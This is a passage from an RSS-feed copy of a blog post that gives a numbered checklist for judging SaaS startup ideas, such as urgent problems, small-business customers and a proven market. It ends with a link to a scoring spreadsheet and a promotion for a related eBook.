be able to turn a profit? Obvious, but a surprising number of founders don't work this out until much later!</p><p>5. <strong>Can operate profitably without the founder</strong>. Can this business grow profitably without you?</p><h3 id="should-haves">Should-haves</h3><p>6. <strong>Solves my own problem</strong>. Are you building this for yourself? Great start if you are!</p><p>7. <strong>"Hair on fire" problem</strong>. Will your customers need your solution urgently? Or is it not that important?</p><p>8. <strong>Frequently occurring problem</strong>. How often does someone have this problem? Hourly, daily, or at most weekly, would be best.</p><p>9. <strong>Growing market with this problem</strong>. More and more people are having this problem every day. More and more people will want your solution.</p><p>10. <strong>This is a mandatory problem</strong>. For example, this there's been a change in law and your customers need a solution. Like GDPR.</p><p>11. <strong>Customers are small businesses</strong>. These are the best customers to have because they have money, are motivated to spend, and has short lead times.</p><p>12. <strong>Founder has built an audience in target group</strong>. Do you already have followers or subscribers that have this problem.</p><p>13. <strong>Can be launched quickly</strong>. The faster you can launch, the quicker you can learn, and the quicker you get to revenue.</p><p>14. <strong>Clear customer acquisition channel</strong>. You can think of at least one obvious way to reach your target customers and offer your solution.</p><p>15. <strong>Founder - market fit</strong>. Do you know this market well?</p><p>16. <strong>Founder - product fit</strong>. Are you the right person to create this solution? Do you need to build a team?</p><p>17. <strong>Founder unfair advantage</strong>. Are you one of only a handful of people who can build on this idea? E.g. you own a patent.</p><p>18. <strong>You love serving this market</strong>. Will you enjoy talking to and serving this group of customers day in and day out? Do you genuinely want to help them?</p><p>19. <strong>Market is proven</strong>. Are people already paying money to solve this problem? Are your competitors making tonnes of money?</p><p>20. <strong>Arduous but not impossible</strong>. Is this a problem that not many people want to solve because it's so troublesome? Is it a solution that requires a lot of "<a href="http://paulgraham.com/schlep.html">schlep</a>"?</p><p>21. <strong>Unique value proposition</strong>. Are you providing novel solution to the problem? Perhaps focusing on a small part of the bigger problem and providing a focused, but effective, solution?</p><p>22. <strong>Can be a sellable asset</strong>. Can this business become an asset that you can sell later?</p><p>23. <strong>No monopolies</strong>. Are the incumbents monopolies that can wipe you out in 2 seconds?</p><h3 id="nice-to-haves">Nice-to-haves</h3><p>24. <strong>Market is highly motivated</strong>. The market is willing to spend money on anything that will improve their lives or work.</p><p>25. <strong>The market has the purchasing power</strong>. They have the money to spend on your solution.</p><p>26. <strong>Able to pre-sell the solution</strong>. Are you able to pre-sell the solution, as a way to validate demand?</p><p>27. <strong>The problem is not sexy</strong>. Sexy products get people excited, but also attracts more competitors. There's money being made on problems that don't get mentioned in TechCrunch or Wired.</p><p>28. <strong>The solution is simple</strong>. Is your solution simpler to understand and use than your competitor's?</p><p>29. <strong>Target customers exist as communities</strong>. Do your customers hang out online together? This helps with word of mouth traffic.</p><p>30. <strong>Quick time to first customer</strong>. Are you able to get your first paying customer within 4 weeks? Or quicker, relative to your other ideas?</p><h2 id="how-to-use-this-checklist">How to use this checklist</h2><p>To make it easy for you, I have created a checklist in a Google Sheet with all the criteria above. Just make a copy of it and then use it to quickly tick off attributes of your idea, and to find gaps in research that you may need to do. I've included one idea as an example - a simple Shopify analytics app for store owners.</p><p><strong>‚úÖ </strong><a href="https://docs.google.com/spreadsheets/d/101Hi6atV5cY3R4Fb39jWv7slS2Tth3Ti54fAMrVODno/edit?usp=sharing"><strong>Get the SaaS Idea Evaluation Sheet here</strong></a><strong>.</strong></p><p>Here's how I use the scoring sheet:</p><ul><li>As a way to score and compare my ideas before I pick the next one to work on. For this, I assign points to the criteria in each category and then just sum up the ones that the idea has.</li><li>As a checklist for questions I should be asking myself.</li><li>As a way to evaluate other people's ideas, when they ask, "do you think this is a good idea?".</li></ul><blockquote>"The Idea Matters - A bad idea, executed well, will not make a good business" ‚Äî Dan Norris, The 7 Day Startup</blockquote><h2 id="if-you-want-more-">If you want more...</h2><p>This post is a short version of an eBook I am creating, titled <a href="https://gumroad.com/l/evaluatesaas">"How to pick a good SaaS idea: A pre-validation guide and evaluation checklist"</a>. </p><p>In the eBook I include:</p><ul><li>Descriptions, example startups, supporting resources, and quotes from founders, for each criteria.</li><li>A Google Sheet for automatically scoring and comparing your ideas.</li><li>A beautifully formatted PDF scoring sheet, for printing out.</li><li>PDF, MOBI, and ePub versions.</li></ul><p>If you feel that this will help you, then you can pre-order the eBook at the discounted pre-sale price of<strong> $4.99</strong>: click the button below or click <a href="https://gumroad.com/l/evaluatesaas">https://gumroad.com/l/evaluatesaas</a> now.</p><!--kg-card-begin: html-->
<p><a href="https://gum.co/evaluatesaas?wanted=true" target="_blank">Buy the eBook</a></p><!--kg-card-end: html-->

                    <br><hr>
                    <p><strong>Don't miss the next post</strong>. Sign up to my newsletter:</p>
                    
                    <p><strong>Are you on Twitter?</strong> It would be nice to connect. <a href="https://twitter.com/farez">Follow me on Twitter (@farez)</a>, and do say hello!</p>

                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://farez.me/how-to-pick-a-saas-startup-idea-a-pre-validation-checklist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24925642</guid>
            <pubDate>Thu, 29 Oct 2020 00:07:43 GMT</pubDate>
        </item>
    </channel>
</rss>
